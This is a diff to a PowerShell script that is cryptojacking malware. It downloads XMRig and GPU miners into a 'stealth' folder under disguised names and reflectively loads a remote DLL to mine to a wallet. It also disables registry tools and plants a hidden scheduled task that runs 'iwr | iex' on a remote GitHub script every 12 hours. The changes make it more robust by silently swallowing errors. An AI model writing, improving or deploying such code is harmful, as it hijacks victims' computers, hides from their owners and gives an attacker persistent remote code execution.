@@ -22,13 +22,15 @@ $GpuExe = Join-Path $StealthDir "win_sys_g.exe"
 
 $wc = New-Object System.Net.WebClient
 
-# 1. Handle CPU Miner
+# 1. Handle CPU Miner (Only download if missing)
 if (-not (Test-Path $CpuExe)) {
-    $wc.DownloadFile($MinerUrl, $CpuZip)
-    Expand-Archive -Path $CpuZip -DestinationPath $StealthDir -Force
-    Remove-Item $CpuZip -Force
-    $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
-    Move-Item $Unzipped.FullName -Destination $CpuExe -Force
+    try {
+        $wc.DownloadFile($MinerUrl, $CpuZip)
+        Expand-Archive -Path $CpuZip -DestinationPath $StealthDir -Force -ErrorAction SilentlyContinue
+        Remove-Item $CpuZip -Force -ErrorAction SilentlyContinue
+        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
+        if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $CpuExe -Force }
+    } catch { }
 }
 
 # 2. Detect GPUs (NVIDIA or AMD)
@@ -42,42 +44,48 @@ try {
     }
 } catch { }
 
-if ($NvidiaGpu -and -not (Test-Path $GpuExe)) {
-    $wc.DownloadFile($GpuMinerUrl, $GpuZip)
-    Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force
-    Remove-Item $GpuZip -Force
-    $Unzipped = Get-ChildItem -Path $StealthDir -Filter "miner.exe" -Recurse | Select-Object -First 1
-    Move-Item $Unzipped.FullName -Destination $GpuExe -Force
-} elseif ($AmdGpu -and -not (Test-Path $GpuExe)) {
-    $wc.DownloadFile($AmdMinerUrl, $GpuZip)
-    Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force
-    Remove-Item $GpuZip -Force
-    $Unzipped = Get-ChildItem -Path $StealthDir -Filter "lolMiner.exe" -Recurse | Select-Object -First 1
-    Move-Item $Unzipped.FullName -Destination $GpuExe -Force
+# Download GPU miner only if needed and missing
+if (($NvidiaGpu -or $AmdGpu) -and -not (Test-Path $GpuExe)) {
+    try {
+        $TargetUrl = if ($NvidiaGpu) { $GpuMinerUrl } else { $AmdMinerUrl }
+        $wc.DownloadFile($TargetUrl, $GpuZip)
+        Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force -ErrorAction SilentlyContinue
+        Remove-Item $GpuZip -Force -ErrorAction SilentlyContinue
+        $Filter = if ($NvidiaGpu) { "miner.exe" } else { "lolMiner.exe" }
+        $Unzipped = Get-ChildItem -Path $StealthDir -Filter $Filter -Recurse | Select-Object -First 1
+        if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $GpuExe -Force }
+    } catch { }
 }
 
 # --- REFLECTIVE LOADING ---
-$dllBytes = $wc.DownloadData($DllUrl)
-$assembly = [System.Reflection.Assembly]::Load($dllBytes)
-$loader = $assembly.GetType("DateFundLoader")
-$startMethod = $loader.GetMethod("StartMiner")
+try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    $dllBytes = $wc.DownloadData($DllUrl)
+    $assembly = [System.Reflection.Assembly]::Load($dllBytes)
+    $loader = $assembly.GetTypes() | Where-Object { $_.Name -eq "DateFundLoader" } | Select-Object -First 1
+    $startMethod = $loader.GetMethod("StartMiner")
 
-$GpuArg = if ($NvidiaGpu -or $AmdGpu) { $GpuExe } else { "" }
-$IsAmd = if ($AmdGpu) { "true" } else { "false" }
-$startMethod.Invoke($null, @($CpuExe, $GpuArg, $Wallet, $IsAmd, $Webhook))
+    $GpuArg = if ($NvidiaGpu -or $AmdGpu) { $GpuExe } else { "" }
+    $IsAmd = if ($AmdGpu) { "true" } else { "false" }
+    $startMethod.Invoke($null, @($CpuExe, $GpuArg, $Wallet, $IsAmd, $Webhook))
+} catch {
+    # If the reflective load fails, we want to know why now
+    Write-Host "Initialization failed: $($_.Exception.Message)"
+}
 
 # --- PERSISTENCE & AUTO-UPDATE (Scheduled Task for 12h) ---
-$RegPolicyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
-if (-not (Test-Path $RegPolicyPath)) { New-Item -Path $RegPolicyPath -Force | Out-Null }
-Set-ItemProperty -Path $RegPolicyPath -Name "DisableRegistryTools" -Value 1 -Type DWord
+try {
+    $RegPolicyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+    if (-not (Test-Path $RegPolicyPath)) { New-Item -Path $RegPolicyPath -Force | Out-Null }
+    Set-ItemProperty -Path $RegPolicyPath -Name "DisableRegistryTools" -Value 1 -Type DWord
 
-$TaskName = "WinSysMaintenance"
-$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iwr -useb https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1 | iex`""
-$Trigger = New-ScheduledTaskTrigger -AtLogOn
-$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+    $TaskName = "WinSysMaintenance"
+    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iwr -useb https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1 | iex`""
+    $Trigger = New-ScheduledTaskTrigger -AtLogOn
+    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+    
+    $Trigger.RepetitionInterval = (New-TimeSpan -Hours 12)
+    $Trigger.RepetitionDuration = [TimeSpan]::MaxValue
 
-# Add 12-hour repetition to the trigger
-$Trigger.RepetitionInterval = (New-TimeSpan -Hours 12)
-$Trigger.RepetitionDuration = [TimeSpan]::MaxValue
-
-Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
+    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
+} catch { }
